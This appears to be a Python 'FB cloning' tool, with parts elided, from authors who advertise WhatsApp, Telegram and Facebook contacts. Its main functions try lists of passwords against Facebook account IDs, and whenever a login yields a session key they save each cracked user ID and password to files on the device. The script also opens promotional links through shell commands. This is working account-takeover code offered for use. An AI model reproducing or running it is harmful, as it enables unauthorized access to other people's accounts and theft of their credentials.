...
#AFG
#WE ARE BROTHERS
#CONTACT WITH ADMIN MOHD AMIL's WHATSAPP : +8303245093
#JOIN OUR TELEGRAM CHANNEL :  @https://web.telegram.org/a/
from os import path
...
print('\n\033[1;31m ⚡𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 MOHD AMIL 𝙵𝙱 𝙲𝙻𝙾𝙽𝙴𝙸𝙽𝙶 𝚃𝙾𝙾𝙻𝚂 ⚡');time.sleep(3)


print('\n\033[1;32m亗𝙏𝘼𝙉𝙆𝙎 𝙁𝙊𝙍 𝙐𝙎𝙀 𝙊𝙐𝙍 𝙏𝙊𝙊𝙇𝙎亗' );time.sleep(1)
os.system('xdg-open https://www.facebook.com/groups/457911718085844/?ref=share')
logo = """
\033[1;90m   
      \033[1;32m 
...
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    : AMIL
》FACEBOOK  : MOHD AMIL
》GITHUB    : MOHD AMIL
》WHATSAPP  : +918303345093
》TAEM      : SAHIL AMIL KAMRAN AHMAD
\033[1;31m------------------------------------------------
"""
def linex():
	print('\033[1;37m----------------------------------------------')
...
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;96m[1] RANDOM CLONING V1\n\033[1;95m[2] RANDOM CLONING V2\n\033[1;93m[3] CONTACT BY MOHD AMIL \n\033[1;91m[E] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			os.system('xdg-open   https://www.facebook.com/zoyuka.ammu?mibextid=ZbWKwL')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['03','3']:
				os.system('xdg-opopenhttps://www.facebook.com/zoyuka.ammu?mibextid=ZbWKwL')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def awmafghan():
		...
		os.system('xdg-open  https://web.telegram.org/a/')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AMIL-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AMIL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AMIL-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/AMIL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AMIL-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AMIL-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [AMIL-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
